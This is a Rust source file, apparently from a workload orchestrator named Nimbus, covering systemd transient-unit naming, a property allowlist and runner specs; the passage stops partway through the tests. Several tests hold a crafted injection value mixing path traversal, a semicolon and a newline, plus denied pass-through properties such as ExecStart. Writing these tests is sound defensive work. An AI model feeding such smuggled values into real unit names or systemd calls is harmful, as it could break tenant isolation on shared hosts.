use std::collections::BTreeMap;
use std::future::Future;
use std::pin::Pin;

use nimbus_core::{Error, Result, non_empty};
use serde::Serialize;
use sha2::{Digest, Sha256};

use super::{
    LocalEnforcementBinding, NodeStatusAuthorizer, TenantWorkloadCondition,
    TenantWorkloadConditionStatus, TenantWorkloadConditionType, TenantWorkloadPhase,
    TenantWorkloadSpec, TenantWorkloadStatus, TenantWorkloadStatusPatch,
};

pub type HostLifecycleFuture<'a, T> = Pin<Box<dyn Future<Output = Result<T>> + Send + 'a>>;

pub trait HostLifecycleBackend: Send + Sync + 'static {
    fn validate(
        &self,
        binding: &LocalEnforcementBinding,
        request: HostLifecycleRequest,
    ) -> Result<HostLifecyclePlan>;

    fn start<'a>(
        &'a self,
        plan: HostLifecyclePlan,
    ) -> HostLifecycleFuture<'a, TenantWorkloadStatus>;

    fn stop<'a>(
        &'a self,
        workload_id: TenantWorkloadId,
    ) -> HostLifecycleFuture<'a, HostLifecycleStatus>;

    fn inspect<'a>(
        &'a self,
        workload_id: TenantWorkloadId,
    ) -> HostLifecycleFuture<'a, HostLifecycleStatus>;
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
pub struct TenantWorkloadId(String);

impl TenantWorkloadId {
    pub fn from_spec(spec: &TenantWorkloadSpec) -> Self {
        let mut digest = Sha256::new();
        digest.update(spec.workload_uid().as_str().as_bytes());
        digest.update(b"\0");
        digest.update(spec.decision_id().as_str().as_bytes());
        Self(format!("tw_{:x}", digest.finalize()))
    }

    /// Build a workload id from a raw string for NDB5's live integration
    /// tests, which need a unique id without a full `TenantWorkloadSpec`.
    #[cfg(feature = "systemd-dbus-integration-tests")]
    pub fn for_integration_test(value: impl Into<String>) -> Self {
        Self(value.into())
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }

    fn unit_component(&self) -> String {
        sanitize_unit_component(self.as_str())
            .chars()
            .take(48)
            .collect()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum SystemdUnitKind {
    Service,
    Scope,
}

impl SystemdUnitKind {
    fn extension(self) -> &'static str {
        match self {
            Self::Service => "service",
            Self::Scope => "scope",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize)]
pub struct SystemdUnitName(String);

impl SystemdUnitName {
    pub fn for_workload(workload_id: &TenantWorkloadId, kind: SystemdUnitKind) -> Result<Self> {
        let component = workload_id.unit_component();
        Self::new(format!("nimbus-{component}.{}", kind.extension()))
    }

    pub fn new(value: impl Into<String>) -> Result<Self> {
        let value = non_empty(value, "systemd unit name")?;
        if value.len() > 128 {
            return Err(Error::InvalidInput(
                "systemd unit name must be at most 128 bytes".to_string(),
            ));
        }
        if value.contains('/')
            || value.contains(char::is_whitespace)
            || value.contains(';')
            || value.contains("..")
            || value.starts_with('.')
        {
            return Err(Error::InvalidInput(format!(
                "systemd unit name `{value}` contains disallowed characters"
            )));
        }
        if !(value.ends_with(".service") || value.ends_with(".scope")) {
            return Err(Error::InvalidInput(format!(
                "systemd unit name `{value}` must end with .service or .scope"
            )));
        }
        Ok(Self(value))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HostExecutable(String);

impl HostExecutable {
    pub fn trusted(path: impl Into<String>) -> Result<Self> {
        let path = non_empty(path, "host executable path")?;
        if !path.starts_with('/') || path.contains('\0') || path.contains('\n') {
            return Err(Error::InvalidInput(format!(
                "trusted host executable `{path}` must be an absolute path without control characters"
            )));
        }
        Ok(Self(path))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum HostLifecycleBackendKind {
    DirectProcess,
    SystemdTransientUnit,
}

impl HostLifecycleBackendKind {
    pub fn label(self) -> &'static str {
        match self {
            Self::DirectProcess => "direct_process",
            Self::SystemdTransientUnit => "systemd_transient_unit",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum RunnerKind {
    Container,
    Krun,
}

impl RunnerKind {
    fn trusted_executable(self) -> &'static str {
        match self {
            Self::Container => "/usr/libexec/nimbus/nimbus-container-runner",
            Self::Krun => "/usr/libexec/nimbus/nimbus-krun-runner",
        }
    }

    fn label(self) -> &'static str {
        match self {
            Self::Container => "container",
            Self::Krun => "krun",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct RunnerSpec {
    kind: RunnerKind,
    bundle_path: String,
    memory_max_bytes: Option<u64>,
    cpu_weight: Option<u64>,
    tasks_max: Option<u64>,
}

impl RunnerSpec {
    pub fn container(bundle_path: impl Into<String>) -> Result<Self> {
        Self::new(RunnerKind::Container, bundle_path)
    }

    pub fn krun(bundle_path: impl Into<String>) -> Result<Self> {
        Self::new(RunnerKind::Krun, bundle_path)
    }

    fn new(kind: RunnerKind, bundle_path: impl Into<String>) -> Result<Self> {
        Ok(Self {
            kind,
            bundle_path: trusted_runner_bundle_path(bundle_path, "runner bundle path")?,
            memory_max_bytes: None,
            cpu_weight: None,
            tasks_max: None,
        })
    }

    pub fn with_memory_max_bytes(mut self, value: u64) -> Self {
        self.memory_max_bytes = Some(value);
        self
    }

    pub fn with_cpu_weight(mut self, value: u64) -> Self {
        self.cpu_weight = Some(value);
        self
    }

    pub fn with_tasks_max(mut self, value: u64) -> Self {
        self.tasks_max = Some(value);
        self
    }

    pub fn kind(&self) -> RunnerKind {
        self.kind
    }

    pub fn bundle_path(&self) -> &str {
        &self.bundle_path
    }

    pub fn into_host_lifecycle_request(
        self,
        backend: HostLifecycleBackendKind,
    ) -> Result<HostLifecycleRequest> {
        let mut properties = vec![
            HostLifecycleProperty::Description(format!("Nimbus {} workload", self.kind.label())),
            HostLifecycleProperty::Restart(HostRestartPolicy::OnFailure),
        ];
        if let Some(value) = self.memory_max_bytes {
            properties.push(HostLifecycleProperty::MemoryMaxBytes(value));
        }
        if let Some(value) = self.cpu_weight {
            properties.push(HostLifecycleProperty::CpuWeight(value));
        }
        if let Some(value) = self.tasks_max {
            properties.push(HostLifecycleProperty::TasksMax(value));
        }
        let request = HostLifecycleRequest::new(
            backend,
            HostExecutable::trusted(self.kind.trusted_executable())?,
        )
        .with_args(["--bundle".to_owned(), self.bundle_path])?;
        Ok(request.with_properties(HostLifecyclePropertySet::new(properties)))
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HostLifecycleJournalSelectorEvidence {
    field: String,
    value: String,
}

impl HostLifecycleJournalSelectorEvidence {
    pub fn new(field: impl Into<String>, value: impl Into<String>) -> Result<Self> {
        let field = non_empty(field, "journal selector field")?;
        let value = non_empty(value, "journal selector value")?;
        if field.contains('\0')
            || field.contains('\n')
            || value.contains('\0')
            || value.contains('\n')
        {
            return Err(Error::InvalidInput(
                "journal selector evidence must not contain control characters".to_string(),
            ));
        }
        Ok(Self { field, value })
    }

    pub fn field(&self) -> &str {
        &self.field
    }

    pub fn value(&self) -> &str {
        &self.value
    }

    pub fn label(&self) -> String {
        format!("{}={}", self.field, self.value)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct TenantWorkloadLifecycleEvidence {
    backend: HostLifecycleBackendKind,
    unit_name: String,
    job_path: Option<String>,
    process_id: Option<u64>,
    cgroup_path: Option<String>,
    journal_selectors: Vec<HostLifecycleJournalSelectorEvidence>,
    status_reason: HostLifecycleStatusReason,
    message: Option<String>,
}

impl TenantWorkloadLifecycleEvidence {
    pub fn from_plan(plan: &HostLifecyclePlan, reason: HostLifecycleStatusReason) -> Self {
        Self {
            backend: plan.backend(),
            unit_name: plan.unit_name().as_str().to_owned(),
            job_path: None,
            process_id: None,
            cgroup_path: None,
            journal_selectors: Vec::new(),
            status_reason: reason,
            message: None,
        }
    }

    pub fn for_observed_unit(
        backend: HostLifecycleBackendKind,
        unit_name: &SystemdUnitName,
        reason: HostLifecycleStatusReason,
    ) -> Self {
        Self {
            backend,
            unit_name: unit_name.as_str().to_owned(),
            job_path: None,
            process_id: None,
            cgroup_path: None,
            journal_selectors: Vec::new(),
            status_reason: reason,
            message: None,
        }
    }

    pub fn with_job_path(mut self, job_path: impl Into<String>) -> Result<Self> {
        self.job_path = Some(high_cardinality_evidence_value(job_path, "job path")?);
        Ok(self)
    }

    pub fn with_process_id(mut self, process_id: u64) -> Self {
        self.process_id = Some(process_id);
        self
    }

    pub fn with_cgroup_path(mut self, cgroup_path: impl Into<String>) -> Result<Self> {
        self.cgroup_path = Some(high_cardinality_evidence_value(cgroup_path, "cgroup path")?);
        Ok(self)
    }

    pub fn with_journal_selectors(
        mut self,
        selectors: impl IntoIterator<Item = HostLifecycleJournalSelectorEvidence>,
    ) -> Self {
        self.journal_selectors = selectors.into_iter().collect();
        self
    }

    pub fn with_message(mut self, message: Option<String>) -> Self {
        self.message = message;
        self
    }

    pub fn backend(&self) -> HostLifecycleBackendKind {
        self.backend
    }

    pub fn unit_name(&self) -> &str {
        &self.unit_name
    }

    pub fn job_path(&self) -> Option<&str> {
        self.job_path.as_deref()
    }

    pub fn process_id(&self) -> Option<u64> {
        self.process_id
    }

    pub fn cgroup_path(&self) -> Option<&str> {
        self.cgroup_path.as_deref()
    }

    pub fn journal_selectors(&self) -> &[HostLifecycleJournalSelectorEvidence] {
        &self.journal_selectors
    }

    pub fn status_reason(&self) -> HostLifecycleStatusReason {
        self.status_reason
    }

    pub fn correlation_ids(&self) -> Vec<String> {
        let mut ids = vec![self.unit_name.clone()];
        if let Some(job_path) = &self.job_path {
            ids.push(job_path.clone());
        }
        if let Some(process_id) = self.process_id {
            ids.push(format!("pid:{process_id}"));
        }
        if let Some(cgroup_path) = &self.cgroup_path {
            ids.push(cgroup_path.clone());
        }
        ids
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HostLifecycleBackendCapabilities {
    backend: HostLifecycleBackendKind,
    available: bool,
    features: BTreeMap<String, bool>,
    failure_reasons: Vec<String>,
}

impl HostLifecycleBackendCapabilities {
    pub fn new(backend: HostLifecycleBackendKind, available: bool) -> Self {
        Self {
            backend,
            available,
            features: BTreeMap::new(),
            failure_reasons: Vec::new(),
        }
    }

    pub fn direct_process() -> Self {
        Self::new(HostLifecycleBackendKind::DirectProcess, true)
            .with_feature("pid1", false)
            .with_feature("dbus", false)
            .with_feature("podman", false)
            .with_feature("conmon", false)
            .with_feature("kvm", false)
    }

    pub fn with_feature(mut self, feature: impl Into<String>, available: bool) -> Self {
        self.features.insert(feature.into(), available);
        self
    }

    pub fn with_failure_reason(mut self, reason: impl Into<String>) -> Result<Self> {
        self.failure_reasons
            .push(non_empty(reason, "backend capability failure reason")?);
        Ok(self)
    }

    pub fn backend(&self) -> HostLifecycleBackendKind {
        self.backend
    }

    pub fn available(&self) -> bool {
        self.available
    }

    pub fn features(&self) -> &BTreeMap<String, bool> {
        &self.features
    }

    pub fn failure_reasons(&self) -> &[String] {
        &self.failure_reasons
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HostLifecycleRequest {
    backend: HostLifecycleBackendKind,
    executable: HostExecutable,
    args: Vec<String>,
    properties: HostLifecyclePropertySet,
    trust_class: RuntimePoolTrustClass,
}

impl HostLifecycleRequest {
    pub fn new(backend: HostLifecycleBackendKind, executable: HostExecutable) -> Self {
        Self {
            backend,
            executable,
            args: Vec::new(),
            properties: HostLifecyclePropertySet::default(),
            trust_class: RuntimePoolTrustClass::SingleTenant,
        }
    }

    pub fn with_args(mut self, args: impl IntoIterator<Item = impl Into<String>>) -> Result<Self> {
        self.args = args
            .into_iter()
            .map(|arg| non_empty(arg, "host lifecycle argument"))
            .collect::<Result<Vec<_>>>()?;
        Ok(self)
    }

    pub fn with_properties(mut self, properties: HostLifecyclePropertySet) -> Self {
        self.properties = properties;
        self
    }

    pub fn with_trust_class(mut self, trust_class: RuntimePoolTrustClass) -> Self {
        self.trust_class = trust_class;
        self
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostLifecyclePlan {
    workload_id: TenantWorkloadId,
    spec: TenantWorkloadSpec,
    backend: HostLifecycleBackendKind,
    unit_name: SystemdUnitName,
    executable: HostExecutable,
    args: Vec<String>,
    properties: HostLifecyclePropertySet,
    trust_class: RuntimePoolTrustClass,
}

impl HostLifecyclePlan {
    pub fn from_binding(
        binding: &LocalEnforcementBinding,
        request: HostLifecycleRequest,
    ) -> Result<Self> {
        let spec = binding.spec().clone();
        let workload_id = TenantWorkloadId::from_spec(&spec);
        let unit_name = SystemdUnitName::for_workload(&workload_id, SystemdUnitKind::Service)?;
        Ok(Self {
            workload_id,
            spec,
            backend: request.backend,
            unit_name,
            executable: request.executable,
            args: request.args,
            properties: request.properties,
            trust_class: request.trust_class,
        })
    }

    pub fn workload_id(&self) -> &TenantWorkloadId {
        &self.workload_id
    }

    pub fn spec(&self) -> &TenantWorkloadSpec {
        &self.spec
    }

    pub fn backend(&self) -> HostLifecycleBackendKind {
        self.backend
    }

    pub fn unit_name(&self) -> &SystemdUnitName {
        &self.unit_name
    }

    pub fn executable(&self) -> &HostExecutable {
        &self.executable
    }

    pub fn args(&self) -> &[String] {
        &self.args
    }

    pub fn properties(&self) -> &HostLifecyclePropertySet {
        &self.properties
    }

    pub fn trust_class(&self) -> RuntimePoolTrustClass {
        self.trust_class
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct HostLifecyclePropertySet {
    properties: Vec<HostLifecycleProperty>,
}

impl HostLifecyclePropertySet {
    pub fn new(properties: impl IntoIterator<Item = HostLifecycleProperty>) -> Self {
        Self {
            properties: properties.into_iter().collect(),
        }
    }

    pub fn from_raw_systemd_properties(
        properties: impl IntoIterator<Item = (impl Into<String>, impl Into<String>)>,
    ) -> Result<Self> {
        properties
            .into_iter()
            .map(|(name, value)| HostLifecycleProperty::from_raw_systemd(name, value))
            .collect::<Result<Vec<_>>>()
            .map(Self::new)
    }

    pub fn properties(&self) -> &[HostLifecycleProperty] {
        &self.properties
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub enum HostLifecycleProperty {
    Description(String),
    Slice(String),
    Restart(HostRestartPolicy),
    RestartSec(u64),
    MemoryMaxBytes(u64),
    CpuWeight(u64),
    TasksMax(u64),
}

impl HostLifecycleProperty {
    fn from_raw_systemd(name: impl Into<String>, value: impl Into<String>) -> Result<Self> {
        let name = name.into();
        let value = value.into();
        match name.as_str() {
            "Description" => Ok(Self::Description(non_empty(value, "Description")?)),
            "Slice" => Ok(Self::Slice(non_empty(value, "Slice")?)),
            "Restart" => Ok(Self::Restart(HostRestartPolicy::parse(&value)?)),
            "RestartSec" => Ok(Self::RestartSec(parse_u64_property(&name, &value)?)),
            "MemoryMax" => Ok(Self::MemoryMaxBytes(parse_u64_property(&name, &value)?)),
            "CPUWeight" => Ok(Self::CpuWeight(parse_u64_property(&name, &value)?)),
            "TasksMax" => Ok(Self::TasksMax(parse_u64_property(&name, &value)?)),
            _ => Err(Error::PermissionDenied(format!(
                "host lifecycle property `{name}` is not allowlisted"
            ))),
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::Description(_) => "Description",
            Self::Slice(_) => "Slice",
            Self::Restart(_) => "Restart",
            Self::RestartSec(_) => "RestartSec",
            Self::MemoryMaxBytes(_) => "MemoryMax",
            Self::CpuWeight(_) => "CPUWeight",
            Self::TasksMax(_) => "TasksMax",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum HostRestartPolicy {
    No,
    OnFailure,
    Always,
}

impl HostRestartPolicy {
    fn parse(value: &str) -> Result<Self> {
        match value {
            "no" => Ok(Self::No),
            "on-failure" => Ok(Self::OnFailure),
            "always" => Ok(Self::Always),
            _ => Err(Error::InvalidInput(format!(
                "unsupported Restart policy `{value}`"
            ))),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum HostLifecycleStatusReason {
    Planned,
    Submitted,
    Running,
    Ready,
    Stopped,
    Failed,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct HostLifecycleStatus {
    workload_id: TenantWorkloadId,
    unit_name: SystemdUnitName,
    phase: TenantWorkloadPhase,
    reason: HostLifecycleStatusReason,
    message: Option<String>,
    lifecycle_evidence: TenantWorkloadLifecycleEvidence,
}

impl HostLifecycleStatus {
    pub(crate) fn new_for_backend(
        workload_id: TenantWorkloadId,
        unit_name: SystemdUnitName,
        phase: TenantWorkloadPhase,
        reason: HostLifecycleStatusReason,
        message: Option<String>,
        lifecycle_evidence: TenantWorkloadLifecycleEvidence,
    ) -> Self {
        Self {
            workload_id,
            unit_name,
            phase,
            reason,
            message,
            lifecycle_evidence,
        }
    }

    pub fn from_backend_state(plan: &HostLifecyclePlan, state: HostBackendObservedState) -> Self {
        let (phase, reason, message) = match state {
            HostBackendObservedState::Planned => (
                TenantWorkloadPhase::Pending,
                HostLifecycleStatusReason::Planned,
                None,
            ),
            HostBackendObservedState::Submitted => (
                TenantWorkloadPhase::Bound,
                HostLifecycleStatusReason::Submitted,
                None,
            ),
            HostBackendObservedState::Running => (
                TenantWorkloadPhase::Running,
                HostLifecycleStatusReason::Running,
                None,
            ),
            HostBackendObservedState::Ready => (
                TenantWorkloadPhase::Ready,
                HostLifecycleStatusReason::Ready,
                None,
            ),
            HostBackendObservedState::Stopped => (
                TenantWorkloadPhase::Deleting,
                HostLifecycleStatusReason::Stopped,
                Some("host lifecycle backend reported stopped".to_string()),
            ),
            HostBackendObservedState::Failed(message) => (
                TenantWorkloadPhase::Denied,
                HostLifecycleStatusReason::Failed,
                Some(message),
            ),
            HostBackendObservedState::Unknown => (
                TenantWorkloadPhase::Degraded,
                HostLifecycleStatusReason::Unknown,
                Some("host lifecycle backend returned unknown state".to_string()),
            ),
        };
        let lifecycle_evidence =
            TenantWorkloadLifecycleEvidence::from_plan(plan, reason).with_message(message.clone());
        Self {
            workload_id: plan.workload_id.clone(),
            unit_name: plan.unit_name.clone(),
            phase,
            reason,
            message,
            lifecycle_evidence,
        }
    }

    pub fn with_lifecycle_evidence(
        mut self,
        lifecycle_evidence: TenantWorkloadLifecycleEvidence,
    ) -> Self {
        self.lifecycle_evidence = lifecycle_evidence.with_message(self.message.clone());
        self
    }

    pub fn to_workload_status(&self, plan: &HostLifecyclePlan) -> Result<TenantWorkloadStatus> {
        let condition = TenantWorkloadCondition::new(
            condition_type_for_reason(self.reason),
            if matches!(self.reason, HostLifecycleStatusReason::Failed) {
                TenantWorkloadConditionStatus::False
            } else {
                TenantWorkloadConditionStatus::True
            },
            format!("{:?}", self.reason),
        )?;
        let patch = TenantWorkloadStatusPatch::observed_status(plan.spec())
            .with_phase(self.phase)
            .with_conditions([condition])
            .with_lifecycle_evidence(self.lifecycle_evidence.clone())
            .with_evidence_correlation_ids(self.lifecycle_evidence.correlation_ids());
        NodeStatusAuthorizer.authorize(plan.spec(), patch)
    }

    pub fn workload_id(&self) -> &TenantWorkloadId {
        &self.workload_id
    }

    pub fn unit_name(&self) -> &SystemdUnitName {
        &self.unit_name
    }

    pub fn phase(&self) -> TenantWorkloadPhase {
        self.phase
    }

    pub fn reason(&self) -> HostLifecycleStatusReason {
        self.reason
    }

    pub fn message(&self) -> Option<&str> {
        self.message.as_deref()
    }

    pub fn lifecycle_evidence(&self) -> &TenantWorkloadLifecycleEvidence {
        &self.lifecycle_evidence
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HostBackendObservedState {
    Planned,
    Submitted,
    Running,
    Ready,
    Stopped,
    Failed(String),
    Unknown,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum RuntimePoolTrustClass {
    SingleTenant,
    SharedTenant,
    ElevatedHostCapabilities,
    BroadCredentialMaterial,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
pub struct RuntimePoolTrustState {
    class: RuntimePoolTrustClass,
}

impl RuntimePoolTrustState {
    pub fn new(class: RuntimePoolTrustClass) -> Self {
        Self { class }
    }

    pub fn class(self) -> RuntimePoolTrustClass {
        self.class
    }

    pub fn record_exposure(&mut self, exposure: RuntimePoolTrustClass) {
        self.class = self.class.max(exposure);
    }

    pub fn can_reuse_for(self, required: RuntimePoolTrustClass) -> bool {
        self.class <= required
    }

    pub fn requires_teardown_for(self, required: RuntimePoolTrustClass) -> bool {
        !self.can_reuse_for(required)
    }
}

fn condition_type_for_reason(reason: HostLifecycleStatusReason) -> TenantWorkloadConditionType {
    match reason {
        HostLifecycleStatusReason::Planned => TenantWorkloadConditionType::LifecyclePlanned,
        HostLifecycleStatusReason::Submitted => TenantWorkloadConditionType::UnitSubmitted,
        HostLifecycleStatusReason::Running => TenantWorkloadConditionType::Running,
        HostLifecycleStatusReason::Ready => TenantWorkloadConditionType::Ready,
        HostLifecycleStatusReason::Stopped => TenantWorkloadConditionType::Deleting,
        HostLifecycleStatusReason::Failed => TenantWorkloadConditionType::Denied,
        HostLifecycleStatusReason::Unknown => TenantWorkloadConditionType::Degraded,
    }
}

fn parse_u64_property(name: &str, value: &str) -> Result<u64> {
    value.parse::<u64>().map_err(|error| {
        Error::InvalidInput(format!(
            "host lifecycle property `{name}` value `{value}` must be u64: {error}"
        ))
    })
}

fn trusted_runner_bundle_path(value: impl Into<String>, field: &str) -> Result<String> {
    let value = non_empty(value, field)?;
    if !value.starts_with('/') || value.contains('\0') || value.contains('\n') {
        return Err(Error::InvalidInput(format!(
            "{field} `{value}` must be an absolute path without control characters"
        )));
    }
    if nimbus_core::has_parent_dir_component(std::path::Path::new(&value)) {
        return Err(Error::InvalidInput(format!(
            "{field} `{value}` must not contain parent-directory segments"
        )));
    }
    Ok(value)
}

fn high_cardinality_evidence_value(value: impl Into<String>, field: &str) -> Result<String> {
    let value = non_empty(value, field)?;
    if value.contains('\0') || value.contains('\n') {
        return Err(Error::InvalidInput(format!(
            "{field} evidence must not contain control characters"
        )));
    }
    Ok(value)
}

fn sanitize_unit_component(raw: &str) -> String {
    let mut previous_dash = false;
    let mut sanitized = String::new();
    for byte in raw.bytes() {
        let ch = byte as char;
        let next = if ch.is_ascii_alphanumeric() || ch == '_' {
            ch.to_ascii_lowercase()
        } else {
            '-'
        };
        if next == '-' {
            if !previous_dash {
                sanitized.push(next);
            }
            previous_dash = true;
        } else {
            sanitized.push(next);
            previous_dash = false;
        }
    }
    let sanitized = sanitized.trim_matches('-').to_string();
    if sanitized.is_empty() {
        "workload".to_string()
    } else {
        sanitized
    }
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;
    use std::sync::{Arc, Mutex};

    use nimbus_testing::AdmittedDecisionScenario;

    use super::*;

    #[derive(Default, Clone)]
    struct FakeHostLifecycleBackend {
        statuses: Arc<Mutex<BTreeMap<TenantWorkloadId, HostLifecycleStatus>>>,
    }

    impl HostLifecycleBackend for FakeHostLifecycleBackend {
        fn validate(
            &self,
            binding: &LocalEnforcementBinding,
            request: HostLifecycleRequest,
        ) -> Result<HostLifecyclePlan> {
            HostLifecyclePlan::from_binding(binding, request)
        }

        fn start<'a>(
            &'a self,
            plan: HostLifecyclePlan,
        ) -> HostLifecycleFuture<'a, TenantWorkloadStatus> {
            let statuses = Arc::clone(&self.statuses);
            Box::pin(async move {
                let status = HostLifecycleStatus::from_backend_state(
                    &plan,
                    HostBackendObservedState::Running,
                );
                statuses
                    .lock()
                    .expect("fake backend lock should not be poisoned")
                    .insert(plan.workload_id().clone(), status.clone());
                status.to_workload_status(&plan)
            })
        }

        fn stop<'a>(
            &'a self,
            workload_id: TenantWorkloadId,
        ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
            let statuses = Arc::clone(&self.statuses);
            Box::pin(async move {
                let mut statuses = statuses
                    .lock()
                    .expect("fake backend lock should not be poisoned");
                let previous = statuses.get(&workload_id).cloned().ok_or_else(|| {
                    Error::NotFound(format!(
                        "fake lifecycle backend has no workload {}",
                        workload_id.as_str()
                    ))
                })?;
                let stopped = HostLifecycleStatus {
                    workload_id: workload_id.clone(),
                    unit_name: previous.unit_name().clone(),
                    phase: TenantWorkloadPhase::Deleting,
                    reason: HostLifecycleStatusReason::Stopped,
                    message: Some("fake backend stopped workload".to_string()),
                    lifecycle_evidence: TenantWorkloadLifecycleEvidence::for_observed_unit(
                        previous.lifecycle_evidence().backend(),
                        previous.unit_name(),
                        HostLifecycleStatusReason::Stopped,
                    )
                    .with_message(Some("fake backend stopped workload".to_string())),
                };
                statuses.insert(workload_id, stopped.clone());
                Ok(stopped)
            })
        }

        fn inspect<'a>(
            &'a self,
            workload_id: TenantWorkloadId,
        ) -> HostLifecycleFuture<'a, HostLifecycleStatus> {
            let statuses = Arc::clone(&self.statuses);
            Box::pin(async move {
                statuses
                    .lock()
                    .expect("fake backend lock should not be poisoned")
                    .get(&workload_id)
                    .cloned()
                    .ok_or_else(|| {
                        Error::NotFound(format!(
                            "fake lifecycle backend has no workload {}",
                            workload_id.as_str()
                        ))
                    })
            })
        }
    }

    fn binding() -> LocalEnforcementBinding {
        AdmittedDecisionScenario::new().with_generation(9).binding()
    }

    fn request() -> HostLifecycleRequest {
        HostLifecycleRequest::new(
            HostLifecycleBackendKind::SystemdTransientUnit,
            HostExecutable::trusted("/usr/libexec/nimbus/workload-launcher")
                .expect("trusted executable should parse"),
        )
        .with_args(["--tenant-workload"])
        .expect("arguments should parse")
        .with_properties(HostLifecyclePropertySet::new([
            HostLifecycleProperty::Description("Nimbus tenant workload".to_string()),
            HostLifecycleProperty::Restart(HostRestartPolicy::OnFailure),
            HostLifecycleProperty::MemoryMaxBytes(512 * 1024 * 1024),
        ]))
    }

    #[test]
    fn host_lifecycle_plan_derives_identity_unit_and_properties_from_binding() {
        let binding = binding();
        let plan = HostLifecyclePlan::from_binding(&binding, request())
            .expect("plan should materialize from admitted binding");

        assert_eq!(plan.spec().decision_id(), binding.spec().decision_id());
        assert_eq!(plan.spec().workload_uid(), binding.spec().workload_uid());
        assert_eq!(
            plan.backend(),
            HostLifecycleBackendKind::SystemdTransientUnit
        );
        assert_eq!(
            plan.executable().as_str(),
            "/usr/libexec/nimbus/workload-launcher"
        );
        assert_eq!(plan.args(), &["--tenant-workload".to_string()]);
        assert!(
            plan.unit_name().as_str().starts_with("nimbus-tw_"),
            "unit name should derive from workload ID, not raw tenant input"
        );
        assert!(plan.unit_name().as_str().ends_with(".service"));
        assert_eq!(plan.properties().properties().len(), 3);
        assert_eq!(plan.properties().properties()[0].name(), "Description");
    }

    #[test]
    fn systemd_unit_names_are_sanitized_and_reject_raw_escape_shapes() {
        let malicious = sanitize_unit_component("Tenant A/../../bad; unit\nname");
        assert!(!malicious.contains('/'));
        assert!(!malicious.contains(';'));
        assert!(!malicious.contains(".."));
        assert!(!malicious.contains(char::is_whitespace));

        let workload_id = TenantWorkloadId("tw_Tenant A/../../bad; unit\nname".to_string());
        let unit = SystemdUnitName::for_workload(&workload_id, SystemdUnitKind::Service)
            .expect("derived unit name should sanitize");
        assert_eq!(unit.as_str(), "nimbus-tw_tenant-a-bad-unit-name.service");

        assert!(SystemdUnitName::new("nimbus/escape.service").is_err());
        assert!(SystemdUnitName::new("nimbus bad.service").is_err());
        assert!(SystemdUnitName::new("nimbus..bad.service").is_err());
        assert!(SystemdUnitName::new("nimbus-bad.timer").is_err());
    }

    #[test]
    fn host_lifecycle_property_allowlist_rejects_pass_through_escape_hatches() {
        let allowed = HostLifecyclePropertySet::from_raw_systemd_properties([
            ("Description", "Nimbus workload"),
            ("Restart", "on-failure"),
            ("RestartSec", "2"),
            ("MemoryMax", "536870912"),
            ("CPUWeight", "100"),
            ("TasksMax", "128"),
        ])
        .expect("allowlisted properties should parse");
        assert_eq!(allowed.properties().len(), 6);

        for denied in ["ExecStart", "EnvironmentFile", "PodmanArgs", "Network"] {
            let error = HostLifecyclePropertySet::from_raw_systemd_properties([(
                denied,
                "raw-tenant-value",
            )])
            .expect_err("pass-through property should fail closed");
            assert!(
                error.to_string().contains("not allowlisted"),
                "denied property should name the allowlist failure: {error}"
            );
        }
        assert!(
            HostLifecyclePropertySet::from_raw_systemd_properties([("Restart", "always-reboot",)])
                .is_err()
        );
        assert!(HostExecutable::trusted("relative/path").is_err());
    }

    #[test]
    fn runner_spec_renders_host_lifecycle_request() {
        let systemd = render_runner_spec_to_systemd(
            RunnerSpec::container("/run/nimbus/bundles/workload")
                .expect("container runner spec should parse")
                .with_memory_max_bytes(512 * 1024 * 1024)
                .with_cpu_weight(100)
                .with_tasks_max(128),
        );
        assert_runner_exec(
            &systemd,
            "/usr/libexec/nimbus/nimbus-container-runner",
            &["--bundle", "/run/nimbus/bundles/workload"],
        );
        assert!(systemd.properties().iter().any(|property| {
            matches!(
                property,
                crate::SystemdDbusProperty::MemoryMax(536870912)
                    | crate::SystemdDbusProperty::CpuWeight(100)
                    | crate::SystemdDbusProperty::TasksMax(128)
            )
        }));
    }

    #[test]
    fn container_runner_spec_renders_host_lifecycle_request() {
        let systemd = render_runner_spec_to_systemd(
            RunnerSpec::container("/run/nimbus/bundles/container")
                .expect("container runner spec should parse"),
        );
        assert_runner_exec(
            &systemd,
            "/usr/libexec/nimbus/nimbus-container-runner",
            &["--bundle", "/run/nimbus/bundles/container"],
        );
    }

    #[test]
    fn krun_runner_spec_renders_host_lifecycle_request() {
        let systemd = render_runner_spec_to_systemd(
